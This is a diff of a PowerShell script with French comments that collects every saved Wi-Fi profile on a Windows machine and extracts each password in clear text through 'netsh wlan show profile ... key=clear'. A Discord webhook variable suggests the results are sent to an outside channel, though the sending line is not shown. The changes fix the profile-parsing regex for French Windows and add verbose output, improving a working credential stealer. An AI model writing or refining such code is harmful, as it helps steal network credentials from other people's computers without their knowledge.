@@ -6,7 +6,14 @@ Write-Output "Webhook Discord : $discord"
 
 # Récupération des profils Wi-Fi enregistrés
 Write-Output "Tentative de récupération des profils Wi-Fi..."
-$profiles = netsh wlan show profile | Select-String 'Profil\s+:(.+)'
+$output = netsh wlan show profile
+
+# Affichage de la sortie complète pour vérification
+Write-Output "Sortie complète de 'netsh wlan show profile':"
+Write-Output $output
+
+# Extraction des profils Wi-Fi avec un traitement amélioré
+$profiles = $output | Select-String 'Profil\s+Tous\s+les\s+utilisateurs\s+:\s(.+)'
 
 # Vérification du nombre de profils
 if ($profiles.Count -eq 0) {
@@ -14,7 +21,8 @@ if ($profiles.Count -eq 0) {
 } else {
     Write-Output "Profils Wi-Fi trouvés :"
     foreach ($profile in $profiles) {
-        Write-Output $profile.Matches.Value.Trim()
+        $profileName = $profile.Matches.Value.Trim()
+        Write-Output $profileName
     }
 }
 
@@ -24,8 +32,11 @@ foreach ($profile in $profiles) {
     Write-Output "Traitement du profil Wi-Fi : $wlan"
 
     # Récupération du mot de passe Wi-Fi pour le profil courant
-    $output = netsh wlan show profile name="$wlan" key=clear
-    $passw = ($output | Select-String 'Contenu de la clé\s+:\s(.+)').Matches.Value -replace 'Contenu de la clé\s+:\s', ''
+    $profileOutput = netsh wlan show profile name="$wlan" key=clear
+    Write-Output "Sortie complète pour le profil $wlan :"
+    Write-Output $profileOutput
+
+    $passw = ($profileOutput | Select-String 'Contenu de la clé\s+:\s(.+)').Matches.Value -replace 'Contenu de la clé\s+:\s', ''
 
     # Si aucun mot de passe n'est trouvé
     if ([string]::IsNullOrWhiteSpace($passw)) {
